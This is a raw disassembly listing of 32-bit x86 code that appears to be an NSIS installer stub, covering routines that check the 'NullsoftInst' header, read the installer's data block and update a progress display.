  402bd8:	56                   	push   %esi
  402bd9:	56                   	push   %esi
  402bda:	e8 19 e6 ff ff       	call   0x4011f8
  402bdf:	eb 77                	jmp    0x402c58
  402be1:	56                   	push   %esi
  402be2:	e8 0a e7 ff ff       	call   0x4012f1
  402be7:	e9 ba fd ff ff       	jmp    0x4029a6
  402bec:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  402bef:	74 12                	je     0x402c03
  402bf1:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402bf4:	8b 15 9c 05 47 00    	mov    0x47059c,%edx
  402bfa:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  402c01:	eb 55                	jmp    0x402c58
  402c03:	8b 0d 9c 05 47 00    	mov    0x47059c,%ecx
  402c09:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402c10:	53                   	push   %ebx
  402c11:	e8 88 34 00 00       	call   0x40609e
  402c16:	eb 40                	jmp    0x402c58
  402c18:	8b 0d 54 62 45 00    	mov    0x456254,%ecx
  402c1e:	6a 00                	push   $0x0
  402c20:	23 c8                	and    %eax,%ecx
  402c22:	51                   	push   %ecx
  402c23:	6a 0b                	push   $0xb
  402c25:	ff 75 f8             	push   -0x8(%ebp)
  402c28:	ff 15 78 82 40 00    	call   *0x408278
  402c2e:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  402c32:	74 24                	je     0x402c58
  402c34:	6a 00                	push   $0x0
  402c36:	6a 00                	push   $0x0
  402c38:	ff 75 f8             	push   -0x8(%ebp)
  402c3b:	ff 15 74 82 40 00    	call   *0x408274
  402c41:	eb 15                	jmp    0x402c58
  402c43:	33 f6                	xor    %esi,%esi
  402c45:	46                   	inc    %esi
  402c46:	e8 11 e8 ff ff       	call   0x40145c
  402c4b:	50                   	push   %eax
  402c4c:	e8 f3 2f 00 00       	call   0x405c44
  402c51:	50                   	push   %eax
  402c52:	57                   	push   %edi
  402c53:	e8 7b 2d 00 00       	call   0x4059d3
  402c58:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402c5b:	01 05 48 06 47 00    	add    %eax,0x470648
  402c61:	33 c0                	xor    %eax,%eax
  402c63:	5f                   	pop    %edi
  402c64:	5e                   	pop    %esi
  402c65:	5b                   	pop    %ebx
  402c66:	c9                   	leave
  402c67:	c2 04 00             	ret    $0x4
  402c6a:	8b ff                	mov    %edi,%edi
  402c6c:	63 2c 40             	arpl   %ebp,(%eax,%eax,2)
  402c6f:	00 fd                	add    %bh,%ch
  402c71:	15 40 00 0f 16       	adc    $0x160f0040,%eax
  402c76:	40                   	inc    %eax
  402c77:	00 25 16 40 00 39    	add    %ah,0x39004016
  402c7d:	16                   	push   %ss
  402c7e:	40                   	inc    %eax
  402c7f:	00 46 16             	add    %al,0x16(%esi)
  402c82:	40                   	inc    %eax
  402c83:	00 61 16             	add    %ah,0x16(%ecx)
  402c86:	40                   	inc    %eax
  402c87:	00 d9                	add    %bl,%cl
  402c89:	16                   	push   %ss
  402c8a:	40                   	inc    %eax
  402c8b:	00 07                	add    %al,(%edi)
  402c8d:	17                   	pop    %ss
  402c8e:	40                   	inc    %eax
  402c8f:	00 2d 17 40 00 b6    	add    %ch,0xb6004017
  402c95:	17                   	pop    %ss
  402c96:	40                   	inc    %eax
  402c97:	00 6f 16             	add    %ch,0x16(%edi)
  402c9a:	40                   	inc    %eax
  402c9b:	00 ac 16 40 00 cd 16 	add    %ch,0x16cd0040(%esi,%edx,1)
  402ca2:	40                   	inc    %eax
  402ca3:	00 d3                	add    %dl,%bl
  402ca5:	17                   	pop    %ss
  402ca6:	40                   	inc    %eax
  402ca7:	00 22                	add    %ah,(%edx)
  402ca9:	18 40 00             	sbb    %al,0x0(%eax)
  402cac:	8d 18                	lea    (%eax),%ebx
  402cae:	40                   	inc    %eax
  402caf:	00 c3                	add    %al,%bl
  402cb1:	18 40 00             	sbb    %al,0x0(%eax)
  402cb4:	d7                   	xlat   %ds:(%ebx)
  402cb5:	18 40 00             	sbb    %al,0x0(%eax)
  402cb8:	7b 1a                	jnp    0x402cd4
  402cba:	40                   	inc    %eax
  402cbb:	00 90 1a 40 00 c7    	add    %dl,-0x38ffbfe6(%eax)
  402cc1:	1a 40 00             	sbb    0x0(%eax),%al
  402cc4:	cc                   	int3
  402cc5:	1a 40 00             	sbb    0x0(%eax),%al
  402cc8:	df 1a                	fistps (%edx)
  402cca:	40                   	inc    %eax
  402ccb:	00 68 1b             	add    %ch,0x1b(%eax)
  402cce:	40                   	inc    %eax
  402ccf:	00 a0 1b 40 00 e3    	add    %ah,-0x1cffbfe5(%eax)
  402cd5:	1b 40 00             	sbb    0x0(%eax),%eax
  402cd8:	1c 1c                	sbb    $0x1c,%al
  402cda:	40                   	inc    %eax
  402cdb:	00 a6 1c 40 00 c9    	add    %ah,-0x36ffbfe4(%esi)
  402ce1:	1c 40                	sbb    $0x40,%al
  402ce3:	00 76 1d             	add    %dh,0x1d(%esi)
  402ce6:	40                   	inc    %eax
  402ce7:	00 76 1d             	add    %dh,0x1d(%esi)
  402cea:	40                   	inc    %eax
  402ceb:	00 46 1e             	add    %al,0x1e(%esi)
  402cee:	40                   	inc    %eax
  402cef:	00 59 1e             	add    %bl,0x1e(%ecx)
  402cf2:	40                   	inc    %eax
  402cf3:	00 76 1e             	add    %dh,0x1e(%esi)
  402cf6:	40                   	inc    %eax
  402cf7:	00 93 1e 40 00 f0    	add    %dl,-0xfffbfe2(%ebx)
  402cfd:	1e                   	push   %ds
  402cfe:	40                   	inc    %eax
  402cff:	00 6c 1f 40          	add    %ch,0x40(%edi,%ebx,1)
  402d03:	00 9b 1f 40 00 fe    	add    %bl,-0x1ffbfe1(%ebx)
  402d09:	1f                   	pop    %ds
  402d0a:	40                   	inc    %eax
  402d0b:	00 7d 20             	add    %bh,0x20(%ebp)
  402d0e:	40                   	inc    %eax
  402d0f:	00 af 20 40 00 44    	add    %ch,0x44004020(%edi)
  402d15:	21 40 00             	and    %eax,0x0(%eax)
  402d18:	18 22                	sbb    %ah,(%edx)
  402d1a:	40                   	inc    %eax
  402d1b:	00 50 23             	add    %dl,0x23(%eax)
  402d1e:	40                   	inc    %eax
  402d1f:	00 d8                	add    %bl,%al
  402d21:	23 40 00             	and    0x0(%eax),%eax
  402d24:	ee                   	out    %al,(%dx)
  402d25:	23 40 00             	and    0x0(%eax),%eax
  402d28:	3c 24                	cmp    $0x24,%al
  402d2a:	40                   	inc    %eax
  402d2b:	00 8e 24 40 00 f8    	add    %cl,-0x7ffbfdc(%esi)
  402d31:	24 40                	and    $0x40,%al
  402d33:	00 c1                	add    %al,%cl
  402d35:	25 40 00 48 26       	and    $0x26480040,%eax
  402d3a:	40                   	inc    %eax
  402d3b:	00 ac 26 40 00 c8 26 	add    %ch,0x26c80040(%esi,%eiz,1)
  402d42:	40                   	inc    %eax
  402d43:	00 ef                	add    %ch,%bh
  402d45:	26 40                	es inc %eax
  402d47:	00 6f 27             	add    %ch,0x27(%edi)
  402d4a:	40                   	inc    %eax
  402d4b:	00 5a 28             	add    %bl,0x28(%edx)
  402d4e:	40                   	inc    %eax
  402d4f:	00 ab 28 40 00 77    	add    %ch,0x77004028(%ebx)
  402d55:	29 40 00             	sub    %eax,0x0(%eax)
  402d58:	ad                   	lods   %ds:(%esi),%eax
  402d59:	29 40 00             	sub    %eax,0x0(%eax)
  402d5c:	c9                   	leave
  402d5d:	29 40 00             	sub    %eax,0x0(%eax)
  402d60:	f1                   	int1
  402d61:	29 40 00             	sub    %eax,0x0(%eax)
  402d64:	2f                   	das
  402d65:	2a 40 00             	sub    0x0(%eax),%al
  402d68:	2f                   	das
  402d69:	2b 40 00             	sub    0x0(%eax),%eax
  402d6c:	b6 2b                	mov    $0x2b,%dh
  402d6e:	40                   	inc    %eax
  402d6f:	00 58 2c             	add    %bl,0x2c(%eax)
  402d72:	40                   	inc    %eax
  402d73:	00 58 2c             	add    %bl,0x2c(%eax)
  402d76:	40                   	inc    %eax
  402d77:	00 18                	add    %bl,(%eax)
  402d79:	2c 40                	sub    $0x40,%al
  402d7b:	00 43 2c             	add    %al,0x2c(%ebx)
  402d7e:	40                   	inc    %eax
  402d7f:	00 41 1c             	add    %al,0x1c(%ecx)
  402d82:	40                   	inc    %eax
  402d83:	00 45 1c             	add    %al,0x1c(%ebp)
  402d86:	40                   	inc    %eax
  402d87:	00 49 1c             	add    %cl,0x1c(%ecx)
  402d8a:	40                   	inc    %eax
  402d8b:	00 50 1c             	add    %dl,0x1c(%eax)
  402d8e:	40                   	inc    %eax
  402d8f:	00 62 1c             	add    %ah,0x1c(%edx)
  402d92:	40                   	inc    %eax
  402d93:	00 66 1c             	add    %ah,0x1c(%esi)
  402d96:	40                   	inc    %eax
  402d97:	00 6a 1c             	add    %ch,0x1c(%edx)
  402d9a:	40                   	inc    %eax
  402d9b:	00 6e 1c             	add    %ch,0x1c(%esi)
  402d9e:	40                   	inc    %eax
  402d9f:	00 79 1c             	add    %bh,0x1c(%ecx)
  402da2:	40                   	inc    %eax
  402da3:	00 85 1c 40 00 8d    	add    %al,-0x72ffbfe4(%ebp)
  402da9:	1c 40                	sbb    $0x40,%al
  402dab:	00 9a 1c 40 00 9e    	add    %bl,-0x61ffbfe4(%edx)
  402db1:	1c 40                	sbb    $0x40,%al
  402db3:	00 55 8b             	add    %dl,-0x75(%ebp)
  402db6:	ec                   	in     (%dx),%al
  402db7:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402dbd:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402dc4:	75 19                	jne    0x402ddf
  402dc6:	6a 00                	push   $0x0
  402dc8:	68 fa 00 00 00       	push   $0xfa
  402dcd:	6a 01                	push   $0x1
  402dcf:	ff 75 08             	push   0x8(%ebp)
  402dd2:	ff 15 24 82 40 00    	call   *0x408224
  402dd8:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402ddf:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402de6:	75 4c                	jne    0x402e34
  402de8:	8b 0d 34 a1 42 00    	mov    0x42a134,%ecx
  402dee:	a1 c0 21 43 00       	mov    0x4321c0,%eax
  402df3:	3b c8                	cmp    %eax,%ecx
  402df5:	7c 02                	jl     0x402df9
  402df7:	8b c8                	mov    %eax,%ecx
  402df9:	50                   	push   %eax
  402dfa:	6a 64                	push   $0x64
  402dfc:	51                   	push   %ecx
  402dfd:	ff 15 48 81 40 00    	call   *0x408148
  402e03:	50                   	push   %eax
  402e04:	8d 45 80             	lea    -0x80(%ebp),%eax
  402e07:	68 cc 82 40 00       	push   $0x4082cc
  402e0c:	50                   	push   %eax
  402e0d:	ff 15 38 82 40 00    	call   *0x408238
  402e13:	83 c4 0c             	add    $0xc,%esp
  402e16:	8d 45 80             	lea    -0x80(%ebp),%eax
  402e19:	50                   	push   %eax
  402e1a:	ff 75 08             	push   0x8(%ebp)
  402e1d:	ff 15 28 82 40 00    	call   *0x408228
  402e23:	8d 45 80             	lea    -0x80(%ebp),%eax
  402e26:	50                   	push   %eax
  402e27:	68 06 04 00 00       	push   $0x406
  402e2c:	ff 75 08             	push   0x8(%ebp)
  402e2f:	e8 cb 28 00 00       	call   0x4056ff
  402e34:	33 c0                	xor    %eax,%eax
  402e36:	c9                   	leave
  402e37:	c2 10 00             	ret    $0x10
  402e3a:	56                   	push   %esi
  402e3b:	33 f6                	xor    %esi,%esi
  402e3d:	39 74 24 08          	cmp    %esi,0x8(%esp)
  402e41:	74 18                	je     0x402e5b
  402e43:	a1 30 a1 42 00       	mov    0x42a130,%eax
  402e48:	3b c6                	cmp    %esi,%eax
  402e4a:	74 07                	je     0x402e53
  402e4c:	50                   	push   %eax
  402e4d:	ff 15 1c 82 40 00    	call   *0x40821c
  402e53:	89 35 30 a1 42 00    	mov    %esi,0x42a130
  402e59:	5e                   	pop    %esi
  402e5a:	c3                   	ret
  402e5b:	39 35 30 a1 42 00    	cmp    %esi,0x42a130
  402e61:	74 08                	je     0x402e6b
  402e63:	56                   	push   %esi
  402e64:	e8 61 2d 00 00       	call   0x405bca
  402e69:	5e                   	pop    %esi
  402e6a:	c3                   	ret
  402e6b:	ff 15 90 80 40 00    	call   *0x408090
  402e71:	3b 05 e0 05 47 00    	cmp    0x4705e0,%eax
  402e77:	76 23                	jbe    0x402e9c
  402e79:	56                   	push   %esi
  402e7a:	68 b4 2d 40 00       	push   $0x402db4
  402e7f:	56                   	push   %esi
  402e80:	6a 6f                	push   $0x6f
  402e82:	ff 35 98 05 47 00    	push   0x470598
  402e88:	ff 15 20 82 40 00    	call   *0x408220
  402e8e:	6a 05                	push   $0x5
  402e90:	50                   	push   %eax
  402e91:	a3 30 a1 42 00       	mov    %eax,0x42a130
  402e96:	ff 15 34 82 40 00    	call   *0x408234
  402e9c:	5e                   	pop    %esi
  402e9d:	c3                   	ret
  402e9e:	55                   	push   %ebp
  402e9f:	8b ec                	mov    %esp,%ebp
  402ea1:	56                   	push   %esi
  402ea2:	8b 75 0c             	mov    0xc(%ebp),%esi
  402ea5:	6a 00                	push   $0x0
  402ea7:	8d 45 0c             	lea    0xc(%ebp),%eax
  402eaa:	50                   	push   %eax
  402eab:	56                   	push   %esi
  402eac:	ff 75 08             	push   0x8(%ebp)
  402eaf:	ff 35 10 a0 40 00    	push   0x40a010
  402eb5:	ff 15 54 81 40 00    	call   *0x408154
  402ebb:	85 c0                	test   %eax,%eax
  402ebd:	74 0a                	je     0x402ec9
  402ebf:	39 75 0c             	cmp    %esi,0xc(%ebp)
  402ec2:	75 05                	jne    0x402ec9
  402ec4:	33 c0                	xor    %eax,%eax
  402ec6:	40                   	inc    %eax
  402ec7:	eb 02                	jmp    0x402ecb
  402ec9:	33 c0                	xor    %eax,%eax
  402ecb:	5e                   	pop    %esi
  402ecc:	5d                   	pop    %ebp
  402ecd:	c2 08 00             	ret    $0x8
  402ed0:	6a 00                	push   $0x0
  402ed2:	6a 00                	push   $0x0
  402ed4:	ff 74 24 0c          	push   0xc(%esp)
  402ed8:	ff 35 10 a0 40 00    	push   0x40a010
  402ede:	ff 15 5c 81 40 00    	call   *0x40815c
  402ee4:	c2 04 00             	ret    $0x4
  402ee7:	55                   	push   %ebp
  402ee8:	8b ec                	mov    %esp,%ebp
  402eea:	81 ec 94 00 00 00    	sub    $0x94,%esp
  402ef0:	53                   	push   %ebx
  402ef1:	56                   	push   %esi
  402ef2:	8b 75 14             	mov    0x14(%ebp),%esi
  402ef5:	57                   	push   %edi
  402ef6:	8b 7d 10             	mov    0x10(%ebp),%edi
  402ef9:	89 75 f8             	mov    %esi,-0x8(%ebp)
  402efc:	85 ff                	test   %edi,%edi
  402efe:	75 07                	jne    0x402f07
  402f00:	c7 45 f8 00 80 00 00 	movl   $0x8000,-0x8(%ebp)
  402f07:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402f0b:	8b df                	mov    %edi,%ebx
  402f0d:	85 ff                	test   %edi,%edi
  402f0f:	75 05                	jne    0x402f16
  402f11:	bb 30 21 42 00       	mov    $0x422130,%ebx
  402f16:	8b 45 08             	mov    0x8(%ebp),%eax
  402f19:	85 c0                	test   %eax,%eax
  402f1b:	7c 0e                	jl     0x402f2b
  402f1d:	8b 0d d8 05 47 00    	mov    0x4705d8,%ecx
  402f23:	03 c8                	add    %eax,%ecx
  402f25:	51                   	push   %ecx
  402f26:	e8 a5 ff ff ff       	call   0x402ed0
  402f2b:	6a 04                	push   $0x4
  402f2d:	8d 45 14             	lea    0x14(%ebp),%eax
  402f30:	50                   	push   %eax
  402f31:	e8 68 ff ff ff       	call   0x402e9e
  402f36:	85 c0                	test   %eax,%eax
  402f38:	75 08                	jne    0x402f42
  402f3a:	6a fd                	push   $0xfffffffd
  402f3c:	58                   	pop    %eax
  402f3d:	e9 5f 01 00 00       	jmp    0x4030a1
  402f42:	f7 45 14 00 00 00 80 	testl  $0x80000000,0x14(%ebp)
  402f49:	0f 84 31 01 00 00    	je     0x403080
  402f4f:	ff 15 90 80 40 00    	call   *0x408090
  402f55:	b9 38 21 43 00       	mov    $0x432138,%ecx
  402f5a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402f5d:	e8 1c 38 00 00       	call   0x40677e
  402f62:	81 65 14 ff ff ff 7f 	andl   $0x7fffffff,0x14(%ebp)
  402f69:	8b 45 14             	mov    0x14(%ebp),%eax
  402f6c:	89 45 08             	mov    %eax,0x8(%ebp)
  402f6f:	0f 8e 29 01 00 00    	jle    0x40309e
  402f75:	be 00 40 00 00       	mov    $0x4000,%esi
  402f7a:	39 75 14             	cmp    %esi,0x14(%ebp)
  402f7d:	7d 03                	jge    0x402f82
  402f7f:	8b 75 14             	mov    0x14(%ebp),%esi
  402f82:	56                   	push   %esi
  402f83:	bf 30 e1 41 00       	mov    $0x41e130,%edi
  402f88:	57                   	push   %edi
  402f89:	e8 10 ff ff ff       	call   0x402e9e
  402f8e:	85 c0                	test   %eax,%eax
  402f90:	74 a8                	je     0x402f3a
  402f92:	29 75 14             	sub    %esi,0x14(%ebp)
  402f95:	89 3d 50 21 43 00    	mov    %edi,0x432150
  402f9b:	89 35 54 21 43 00    	mov    %esi,0x432154
  402fa1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402fa4:	b9 38 21 43 00       	mov    $0x432138,%ecx
  402fa9:	89 1d 58 21 43 00    	mov    %ebx,0x432158
  402faf:	a3 5c 21 43 00       	mov    %eax,0x43215c
  402fb4:	e8 e5 37 00 00       	call   0x40679e
  402fb9:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402fbc:	85 c0                	test   %eax,%eax
  402fbe:	0f 8c ae 00 00 00    	jl     0x403072
  402fc4:	8b 35 58 21 43 00    	mov    0x432158,%esi
  402fca:	2b f3                	sub    %ebx,%esi
  402fcc:	ff 15 90 80 40 00    	call   *0x408090
  402fd2:	f6 05 74 06 47 00 01 	testb  $0x1,0x470674
  402fd9:	8b f8                	mov    %eax,%edi
  402fdb:	74 49                	je     0x403026
  402fdd:	2b 45 f4             	sub    -0xc(%ebp),%eax
  402fe0:	3d c8 00 00 00       	cmp    $0xc8,%eax
  402fe5:	77 06                	ja     0x402fed
  402fe7:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  402feb:	75 39                	jne    0x403026
  402fed:	ff 75 08             	push   0x8(%ebp)
  402ff0:	8b 45 08             	mov    0x8(%ebp),%eax
  402ff3:	2b 45 14             	sub    0x14(%ebp),%eax
  402ff6:	6a 64                	push   $0x64
  402ff8:	50                   	push   %eax
  402ff9:	ff 15 48 81 40 00    	call   *0x408148
  402fff:	50                   	push   %eax
  403000:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  403006:	68 00 83 40 00       	push   $0x408300
  40300b:	50                   	push   %eax
  40300c:	ff 15 38 82 40 00    	call   *0x408238
  403012:	83 c4 0c             	add    $0xc,%esp
  403015:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  40301b:	50                   	push   %eax
  40301c:	6a 00                	push   $0x0
  40301e:	e8 24 1a 00 00       	call   0x404a47
  403023:	89 7d f4             	mov    %edi,-0xc(%ebp)
  403026:	33 c0                	xor    %eax,%eax
  403028:	3b f0                	cmp    %eax,%esi
  40302a:	74 3b                	je     0x403067
  40302c:	39 45 10             	cmp    %eax,0x10(%ebp)
  40302f:	75 1e                	jne    0x40304f
  403031:	50                   	push   %eax
  403032:	8d 45 ec             	lea    -0x14(%ebp),%eax
  403035:	50                   	push   %eax
  403036:	56                   	push   %esi
  403037:	53                   	push   %ebx
  403038:	ff 75 0c             	push   0xc(%ebp)
  40303b:	ff 15 50 81 40 00    	call   *0x408150
  403041:	85 c0                	test   %eax,%eax
  403043:	74 34                	je     0x403079
  403045:	39 75 ec             	cmp    %esi,-0x14(%ebp)
  403048:	75 2f                	jne    0x403079
  40304a:	01 75 fc             	add    %esi,-0x4(%ebp)
  40304d:	eb 0c                	jmp    0x40305b
  40304f:	01 75 fc             	add    %esi,-0x4(%ebp)
  403052:	29 75 f8             	sub    %esi,-0x8(%ebp)
  403055:	8b 1d 58 21 43 00    	mov    0x432158,%ebx
  40305b:	83 7d f0 01          	cmpl   $0x1,-0x10(%ebp)
  40305f:	0f 85 3c ff ff ff    	jne    0x402fa1
  403065:	eb 37                	jmp    0x40309e
  403067:	39 45 14             	cmp    %eax,0x14(%ebp)
  40306a:	0f 8f 05 ff ff ff    	jg     0x402f75
  403070:	eb 2c                	jmp    0x40309e
  403072:	6a fc                	push   $0xfffffffc
  403074:	e9 c3 fe ff ff       	jmp    0x402f3c
  403079:	6a fe                	push   $0xfffffffe
  40307b:	e9 bc fe ff ff       	jmp    0x402f3c
  403080:	85 ff                	test   %edi,%edi
  403082:	74 63                	je     0x4030e7
  403084:	39 75 14             	cmp    %esi,0x14(%ebp)
  403087:	7d 03                	jge    0x40308c
  403089:	8b 75 14             	mov    0x14(%ebp),%esi
  40308c:	56                   	push   %esi
  40308d:	57                   	push   %edi
  40308e:	e8 0b fe ff ff       	call   0x402e9e
  403093:	85 c0                	test   %eax,%eax
  403095:	0f 84 9f fe ff ff    	je     0x402f3a
  40309b:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40309e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4030a1:	5f                   	pop    %edi
  4030a2:	5e                   	pop    %esi
  4030a3:	5b                   	pop    %ebx
  4030a4:	c9                   	leave
  4030a5:	c2 10 00             	ret    $0x10
  4030a8:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4030ab:	39 75 14             	cmp    %esi,0x14(%ebp)
  4030ae:	7d 03                	jge    0x4030b3
  4030b0:	8b 75 14             	mov    0x14(%ebp),%esi
  4030b3:	56                   	push   %esi
  4030b4:	bf 30 e1 41 00       	mov    $0x41e130,%edi
  4030b9:	57                   	push   %edi
  4030ba:	e8 df fd ff ff       	call   0x402e9e
  4030bf:	85 c0                	test   %eax,%eax
  4030c1:	0f 84 73 fe ff ff    	je     0x402f3a
  4030c7:	6a 00                	push   $0x0
  4030c9:	8d 45 10             	lea    0x10(%ebp),%eax
  4030cc:	50                   	push   %eax
  4030cd:	56                   	push   %esi
  4030ce:	57                   	push   %edi
  4030cf:	ff 75 0c             	push   0xc(%ebp)
  4030d2:	ff 15 50 81 40 00    	call   *0x408150
  4030d8:	85 c0                	test   %eax,%eax
  4030da:	74 9d                	je     0x403079
  4030dc:	3b 75 10             	cmp    0x10(%ebp),%esi
  4030df:	75 98                	jne    0x403079
  4030e1:	01 75 fc             	add    %esi,-0x4(%ebp)
  4030e4:	29 75 14             	sub    %esi,0x14(%ebp)
  4030e7:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  4030eb:	7f bb                	jg     0x4030a8
  4030ed:	eb af                	jmp    0x40309e
  4030ef:	55                   	push   %ebp
  4030f0:	8b ec                	mov    %esp,%ebp
  4030f2:	83 ec 28             	sub    $0x28,%esp
  4030f5:	53                   	push   %ebx
  4030f6:	56                   	push   %esi
  4030f7:	33 db                	xor    %ebx,%ebx
  4030f9:	57                   	push   %edi
  4030fa:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4030fd:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  403100:	ff 15 90 80 40 00    	call   *0x408090
  403106:	68 04 20 00 00       	push   $0x2004
  40310b:	be d8 d0 4d 00       	mov    $0x4dd0d8,%esi
  403110:	56                   	push   %esi
  403111:	05 e8 03 00 00       	add    $0x3e8,%eax
  403116:	53                   	push   %ebx
  403117:	a3 e0 05 47 00       	mov    %eax,0x4705e0
  40311c:	ff 15 98 80 40 00    	call   *0x408098
  403122:	6a 03                	push   $0x3
  403124:	68 00 00 00 80       	push   $0x80000000
  403129:	56                   	push   %esi
  40312a:	e8 a3 27 00 00       	call   0x4058d2
  40312f:	8b f8                	mov    %eax,%edi
  403131:	89 7d f4             	mov    %edi,-0xc(%ebp)
  403134:	89 3d 10 a0 40 00    	mov    %edi,0x40a010
  40313a:	83 ff ff             	cmp    $0xffffffff,%edi
  40313d:	75 0a                	jne    0x403149
  40313f:	b8 b0 84 40 00       	mov    $0x4084b0,%eax
  403144:	e9 d5 01 00 00       	jmp    0x40331e
  403149:	56                   	push   %esi
  40314a:	be b8 d0 4c 00       	mov    $0x4cd0b8,%esi
  40314f:	56                   	push   %esi
  403150:	e8 37 29 00 00       	call   0x405a8c
  403155:	56                   	push   %esi
  403156:	e8 8e 2e 00 00       	call   0x405fe9
  40315b:	50                   	push   %eax
  40315c:	68 e0 10 4e 00       	push   $0x4e10e0
  403161:	e8 26 29 00 00       	call   0x405a8c
  403166:	53                   	push   %ebx
  403167:	57                   	push   %edi
  403168:	ff 15 94 80 40 00    	call   *0x408094
  40316e:	3b c3                	cmp    %ebx,%eax
  403170:	a3 c0 21 43 00       	mov    %eax,0x4321c0
  403175:	8b f0                	mov    %eax,%esi
  403177:	0f 8e e7 00 00 00    	jle    0x403264
  40317d:	bb 38 a1 42 00       	mov    $0x42a138,%ebx
  403182:	a1 ec 05 47 00       	mov    0x4705ec,%eax
  403187:	f7 d8                	neg    %eax
  403189:	1b c0                	sbb    %eax,%eax
  40318b:	25 00 7e 00 00       	and    $0x7e00,%eax
  403190:	05 00 02 00 00       	add    $0x200,%eax
  403195:	3b f0                	cmp    %eax,%esi
  403197:	8b fe                	mov    %esi,%edi
  403199:	7c 02                	jl     0x40319d
  40319b:	8b f8                	mov    %eax,%edi
  40319d:	57                   	push   %edi
  40319e:	53                   	push   %ebx
  40319f:	e8 fa fc ff ff       	call   0x402e9e
  4031a4:	85 c0                	test   %eax,%eax
  4031a6:	0f 84 79 01 00 00    	je     0x403325
  4031ac:	83 3d ec 05 47 00 00 	cmpl   $0x0,0x4705ec
  4031b3:	75 7a                	jne    0x40322f
  4031b5:	6a 1c                	push   $0x1c
  4031b7:	53                   	push   %ebx
  4031b8:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4031bb:	50                   	push   %eax
  4031bc:	e8 cd 26 00 00       	call   0x40588e
  4031c1:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4031c4:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  4031c9:	75 72                	jne    0x40323d
  4031cb:	81 7d dc ef be ad de 	cmpl   $0xdeadbeef,-0x24(%ebp)
  4031d2:	75 69                	jne    0x40323d
  4031d4:	81 7d e8 49 6e 73 74 	cmpl   $0x74736e49,-0x18(%ebp)
  4031db:	75 60                	jne    0x40323d
  4031dd:	81 7d e4 73 6f 66 74 	cmpl   $0x74666f73,-0x1c(%ebp)
  4031e4:	75 57                	jne    0x40323d
  4031e6:	81 7d e0 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x20(%ebp)
  4031ed:	75 4e                	jne    0x40323d
  4031ef:	09 45 08             	or     %eax,0x8(%ebp)
  4031f2:	8b 45 08             	mov    0x8(%ebp),%eax
  4031f5:	8b 0d 34 a1 42 00    	mov    0x42a134,%ecx
  4031fb:	83 e0 02             	and    $0x2,%eax
  4031fe:	09 05 60 06 47 00    	or     %eax,0x470660
  403204:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403207:	3b c6                	cmp    %esi,%eax
  403209:	89 0d ec 05 47 00    	mov    %ecx,0x4705ec
  40320f:	0f 8f 18 01 00 00    	jg     0x40332d
  403215:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  403219:	75 06                	jne    0x403221
  40321b:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  40321f:	75 41                	jne    0x403262
  403221:	ff 45 fc             	incl   -0x4(%ebp)
  403224:	8d 70 fc             	lea    -0x4(%eax),%esi
  403227:	3b fe                	cmp    %esi,%edi
  403229:	76 12                	jbe    0x40323d
  40322b:	8b fe                	mov    %esi,%edi
  40322d:	eb 0e                	jmp    0x40323d
  40322f:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  403233:	75 08                	jne    0x40323d
  403235:	6a 00                	push   $0x0
  403237:	e8 fe fb ff ff       	call   0x402e3a
  40323c:	59                   	pop    %ecx
  40323d:	3b 35 c0 21 43 00    	cmp    0x4321c0,%esi
  403243:	7d 0d                	jge    0x403252
  403245:	57                   	push   %edi
  403246:	53                   	push   %ebx
  403247:	ff 75 f8             	push   -0x8(%ebp)
  40324a:	e8 be 34 00 00       	call   0x40670d
  40324f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403252:	01 3d 34 a1 42 00    	add    %edi,0x42a134
  403258:	2b f7                	sub    %edi,%esi
  40325a:	85 f6                	test   %esi,%esi
  40325c:	0f 8f 20 ff ff ff    	jg     0x403182
  403262:	33 db                	xor    %ebx,%ebx
  403264:	6a 01                	push   $0x1
  403266:	e8 cf fb ff ff       	call   0x402e3a
  40326b:	59                   	pop    %ecx
  40326c:	39 1d ec 05 47 00    	cmp    %ebx,0x4705ec
  403272:	0f 84 b5 00 00 00    	je     0x40332d
  403278:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  40327b:	74 2a                	je     0x4032a7
  40327d:	ff 35 34 a1 42 00    	push   0x42a134
  403283:	e8 48 fc ff ff       	call   0x402ed0
  403288:	6a 04                	push   $0x4
  40328a:	8d 45 08             	lea    0x8(%ebp),%eax
  40328d:	50                   	push   %eax
  40328e:	e8 0b fc ff ff       	call   0x402e9e
  403293:	85 c0                	test   %eax,%eax
  403295:	0f 84 92 00 00 00    	je     0x40332d
  40329b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40329e:	3b 45 08             	cmp    0x8(%ebp),%eax
  4032a1:	0f 85 86 00 00 00    	jne    0x40332d
  4032a7:	ff 75 ec             	push   -0x14(%ebp)
  4032aa:	6a 40                	push   $0x40
  4032ac:	ff 15 20 81 40 00    	call   *0x408120
